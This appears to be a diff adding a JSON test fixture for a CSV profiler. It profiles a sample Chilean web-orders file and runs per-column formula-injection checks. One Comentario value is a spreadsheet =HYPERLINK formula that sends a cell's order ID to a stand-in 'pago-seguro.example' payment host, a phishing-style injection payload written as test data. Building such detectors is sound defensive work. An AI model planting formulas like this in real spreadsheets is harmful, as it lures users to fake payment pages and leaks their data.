@@ -1,0 +1,255 @@
+{
+  "source": "tests/corpus/cl_web_orders_formulas.csv",
+  "rows": 7,
+  "truncated": false,
+  "delimiter": ";",
+  "delimiter_detected": true,
+  "sep_line": false,
+  "na_tokens": [
+    "s/d"
+  ],
+  "top_n": 3,
+  "compressed": false,
+  "encoding": "utf-8",
+  "thousands": ".",
+  "date_order": "dmy",
+  "bool_words": [],
+  "number_affixes": [
+    "$"
+  ],
+  "accounting_negatives": false,
+  "selected_columns": null,
+  "header_columns": 6,
+  "duplicate_rows": 0,
+  "untrimmed_columns": [],
+  "columns": [
+    {
+      "name": "Pedido",
+      "type": "string",
+      "type_hint": null,
+      "missing": 0,
+      "missing_pct": 0.0,
+      "distinct": 7,
+      "min": null,
+      "max": null,
+      "mean": null,
+      "min_length": 8,
+      "max_length": 8,
+      "top_values": [
+        {
+          "value": "CL-88101",
+          "count": 1
+        },
+        {
+          "value": "CL-88102",
+          "count": 1
+        },
+        {
+          "value": "CL-88103",
+          "count": 1
+        }
+      ],
+      "untrimmed": 0,
+      "affixes": {}
+    },
+    {
+      "name": "Fecha",
+      "type": "date",
+      "type_hint": null,
+      "missing": 0,
+      "missing_pct": 0.0,
+      "distinct": 4,
+      "min": "2026-11-09",
+      "max": "2026-11-12",
+      "mean": null,
+      "min_length": 10,
+      "max_length": 10,
+      "top_values": [
+        {
+          "value": "09/11/2026",
+          "count": 2
+        },
+        {
+          "value": "10/11/2026",
+          "count": 2
+        },
+        {
+          "value": "11/11/2026",
+          "count": 2
+        }
+      ],
+      "untrimmed": 0,
+      "affixes": {}
+    },
+    {
+      "name": "Cliente",
+      "type": "string",
+      "type_hint": null,
+      "missing": 0,
+      "missing_pct": 0.0,
+      "distinct": 7,
+      "min": null,
+      "max": null,
+      "mean": null,
+      "min_length": 12,
+      "max_length": 20,
+      "top_values": [
+        {
+          "value": "Lucía Fuentes",
+          "count": 1
+        },
+        {
+          "value": "Almacén Don Tito",
+          "count": 1
+        },
+        {
+          "value": "@almacen.lucia",
+          "count": 1
+        }
+      ],
+      "untrimmed": 0,
+      "affixes": {}
+    },
+    {
+      "name": "Teléfono",
+      "type": "string",
+      "type_hint": null,
+      "missing": 1,
+      "missing_pct": 14.3,
+      "distinct": 5,
+      "min": null,
+      "max": null,
+      "mean": null,
+      "min_length": 11,
+      "max_length": 15,
+      "top_values": [
+        {
+          "value": "+56 9 8765 4321",
+          "count": 2
+        },
+        {
+          "value": "22 345 6789",
+          "count": 1
+        },
+        {
+          "value": "9 1234 5678",
+          "count": 1
+        }
+      ],
+      "untrimmed": 0,
+      "affixes": {}
+    },
+    {
+      "name": "Comentario",
+      "type": "string",
+      "type_hint": null,
+      "missing": 1,
+      "missing_pct": 14.3,
+      "distinct": 6,
+      "min": null,
+      "max": null,
+      "mean": null,
+      "min_length": 1,
+      "max_length": 65,
+      "top_values": [
+        {
+          "value": "Dejar en conserjería",
+          "count": 1
+        },
+        {
+          "value": "=HYPERLINK(\"http://pago-seguro.example/?id=\"&A4;\"Confirmar pago\")",
+          "count": 1
+        },
+        {
+          "value": "-- tocar timbre dos veces --",
+          "count": 1
+        }
+      ],
+      "untrimmed": 0,
+      "affixes": {}
+    },
+    {
+      "name": "Total",
+      "type": "int",
+      "type_hint": null,
+      "missing": 0,
+      "missing_pct": 0.0,
+      "distinct": 7,
+      "min": -12990,
+      "max": 112300,
+      "mean": 25755.7,
+      "min_length": 7,
+      "max_length": 9,
+      "top_values": [
+        {
+          "value": "$ 24.990",
+          "count": 1
+        },
+        {
+          "value": "$ 112.300",
+          "count": 1
+        },
+        {
+          "value": "$ 8.990",
+          "count": 1
+        }
+      ],
+      "untrimmed": 0,
+      "affixes": {
+        "$": 7
+      }
+    }
+  ],
+  "baseline": null,
+  "checks": [
+    {
+      "check": "formula",
+      "column": "Cliente",
+      "limit": 0,
+      "value": 1,
+      "passed": false,
+      "formulas": {
+        "@almacen.lucia": 1
+      }
+    },
+    {
+      "check": "formula",
+      "column": "Teléfono",
+      "limit": 0,
+      "value": 3,
+      "passed": false,
+      "formulas": {
+        "+56 9 8765 4321": 2,
+        "+56 2 2345 6789": 1
+      }
+    },
+    {
+      "check": "formula",
+      "column": "Comentario",
+      "limit": 0,
+      "value": 3,
+      "passed": false,
+      "formulas": {
+        "=HYPERLINK(\"http://pago-seguro.example/?id=\"&A4;\"Confirmar pago\")": 1,
+        "-- tocar timbre dos veces --": 1,
+        "=1+1": 1
+      }
+    },
+    {
+      "check": "formula",
+      "column": "Total",
+      "limit": 0,
+      "value": 0,
+      "passed": true,
+      "formulas": {}
+    },
+    {
+      "check": "formula",
+      "column": "Pedido",
+      "limit": 0,
+      "value": 0,
+      "passed": true,
+      "formulas": {}
+    }
+  ]
+}
